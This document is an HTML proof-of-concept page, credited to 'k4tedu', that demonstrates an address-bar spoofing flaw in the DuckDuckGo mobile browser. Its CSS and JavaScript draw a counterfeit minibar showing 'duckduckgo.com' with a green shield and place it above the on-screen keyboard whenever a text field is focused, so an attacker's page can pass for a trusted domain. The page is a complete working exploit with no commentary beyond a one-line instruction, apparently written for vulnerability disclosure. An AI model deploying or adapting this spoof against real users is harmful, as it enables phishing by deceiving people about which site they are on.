<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>PoC - DuckDuckGo Minibar UI Spoofing</title>
  <style>
    body {
      margin: 0;
      padding: 20px;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      background-color: white; 
      color: black;
    }

    button { padding: 12px 18px; font-size: 16px; margin-bottom: 10px; cursor: pointer; }
    textarea { width: 100%; font-size: 18px; padding: 10px; margin-top: 20px; box-sizing: border-box; border: 1px solid #ccc; }

    .fake-bar-wrapper {
      position: fixed;
      width: 100%;
      left: 0;
      z-index: 9999;
      background-color: #222222;
      padding: 10px 14px;
      box-sizing: border-box;
      opacity: 0;
      visibility: hidden;
      transition: opacity 0.3s ease, bottom 0.2s ease;
      pointer-events: none;
      
      display: flex;
      align-items: center;
    }

    .fake-bar-wrapper.show { 
      opacity: 1; 
      visibility: visible; 
      pointer-events: auto;
    }

    .ddg-pill {
      background-color: #333333;
      flex-grow: 1;
      height: 46px;
      border-radius: 24px;
      display: flex;
      align-items: center;
      padding: 0 12px;
      box-sizing: border-box;
      box-shadow: 0 0 0 4px rgba(255, 255, 255, 0.03);
      margin-right: 14px;
      overflow: hidden;
    }

    .ddg-shield-wrapper {
      width: 26px;
      height: 26px;
      background-color: #292929;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      flex-shrink: 0;
      margin-right: 10px;
    }

    .ddg-shield-icon {
      width: 22px;
      height: 22px;
    }

    .url-text {
      color: #ffffff;
      font-size: 17px;
      white-space: nowrap;
      overflow: hidden;
      text-overflow: ellipsis;
      font-weight: 400;
    }

    .ddg-actions {
      display: flex;
      align-items: center;
      gap: 16px;
      flex-shrink: 0;
    }

    .ddg-fire-icon {
      width: 22px;
      height: 22px;
      fill: #a5a5a5;
    }

    .ddg-tab-box {
      width: 20px;
      height: 20px;
      border: 2px solid #a5a5a5;
      border-radius: 6px;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 11px;
      font-weight: bold;
      color: #a5a5a5;
      user-select: none;
    }
    
    .ddg-burger-icon {
      width: 20px;
      height: 16px;
      display: flex;
      flex-direction: column;
      justify-content: space-between;
      cursor: pointer;
    }

    .ddg-burger-icon span {
      display: block;
      width: 100%;
      height: 2px;
      background-color: #a5a5a5;
      border-radius: 1px;
    }

    .spacer { height: 800px; }
    .spacer-bottom { height: 1200px; }
    .bottom-text { font-size: 20px; text-align: center; margin: 20px; }
  </style>
</head>
<body>

  <h2>Vulnerability PoC by k4tedu</h2>
  <p>Scroll down to hide the address bar, then tap the textarea.</p>

  <button id="showBtn">Show Keyboard</button>
  <textarea id="ta" placeholder="Top input..."></textarea>

  <div class="fake-bar-wrapper" id="fakeBar">
    
    <div class="ddg-pill">
      <div class="ddg-shield-wrapper">
        <svg class="ddg-shield-icon" viewBox="0 0 24 24">
          <path fill="#27ae60" d="M12 2L4 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-8-3z"/>
          <path fill="#ffffff" d="M10 15.17l-3.5-3.5 1.41-1.42L10 12.34l6.09-6.09 1.41 1.41z"/>
        </svg>
      </div>
      <span class="url-text">duckduckgo.com</span>
    </div>

    <div class="ddg-actions">
      <svg class="ddg-fire-icon" viewBox="0 0 24 24">
        <path d="M12 23c-4.97 0-9-4.03-9-9 0-2.12.74-4.07 1.97-5.61L4.35 7.01C5.89 5.14 8.16 4 10.7 4c.48 0 .95.04 1.42.11l-.81 1.63C10.5 7.37 10 9.13 10 11c0 3.31 2.69 6 6 6 .72 0 1.41-.13 2.05-.36l1.24 1.24C17.5 20.81 14.94 23 12 23zm1.18-20.73c-.27.6-.53 1.23-.76 1.89-1 .18-1.94.61-2.73 1.24-.13.33-.24.67-.32 1.03C10.57 6.13 11.9 6 13.25 6c1.17 0 2.3.11 3.37.31l1.1-2.21c-1.42-.55-2.94-.83-4.54-.83zM12 0c5.52 0 10 4.48 10 10 0 2.27-.76 4.37-2.04 6.06l-1.47-1.47C19.34 13.36 20 11.76 20 10c0-4.41-3.59-8-8-8s-8 3.59-8 8c0 1.5.42 2.91 1.15 4.12L3.62 15.65C2.6 14 2 12.07 2 10 2 4.48 6.48 0 12 0z"/>
      </svg>
      
      <div class="ddg-tab-box">1</div>
      
      <div class="ddg-burger-icon">
        <span></span>
        <span></span>
        <span></span>
      </div>
    </div>

  </div>

  <div class="spacer"></div>
  <textarea id="middleTa" placeholder="Middle input..."></textarea>
  <div class="spacer-bottom"></div>
  
  <div class="bottom-text">End of Page</div>

  <script>
    const fakeBar = document.getElementById('fakeBar');
    const ta = document.getElementById('ta');
    const middleTa = document.getElementById('middleTa');

    function adjustFakeBar() {
      const vv = window.visualViewport;
      if (vv) {
        const keyboardHeight = window.innerHeight - vv.height - vv.offsetTop;
        fakeBar.style.bottom = (keyboardHeight > 0 ? keyboardHeight : 0) + 'px';
      }
    }

    function showFakeBar() {
      fakeBar.classList.add('show');
      adjustFakeBar();
    }

    function hideFakeBar() {
      fakeBar.classList.remove('show');
    }

    if ('visualViewport' in window) {
      window.visualViewport.addEventListener('resize', adjustFakeBar);
      window.visualViewport.addEventListener('scroll', adjustFakeBar);
    }

    document.getElementById("showBtn").onclick = () => {
      ta.focus();
      showFakeBar();
    };

    ta.addEventListener('focus', showFakeBar);
    middleTa.addEventListener('focus', showFakeBar);
    ta.addEventListener('blur', hideFakeBar);
    middleTa.addEventListener('blur', hideFakeBar);
  </script>
</body>
</html>
